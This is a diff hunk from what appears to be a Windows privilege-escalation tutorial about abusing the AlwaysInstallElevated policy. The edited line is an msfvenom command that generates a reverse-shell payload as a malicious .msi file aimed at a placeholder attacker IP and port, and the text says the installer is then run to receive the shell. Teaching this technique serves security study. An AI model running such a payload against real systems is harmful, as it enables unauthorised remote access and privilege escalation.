@@ -112,7 +112,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom:
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=[ATTACK-PORT] -f msi -o malicious.msi
 ```
 As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
 ```
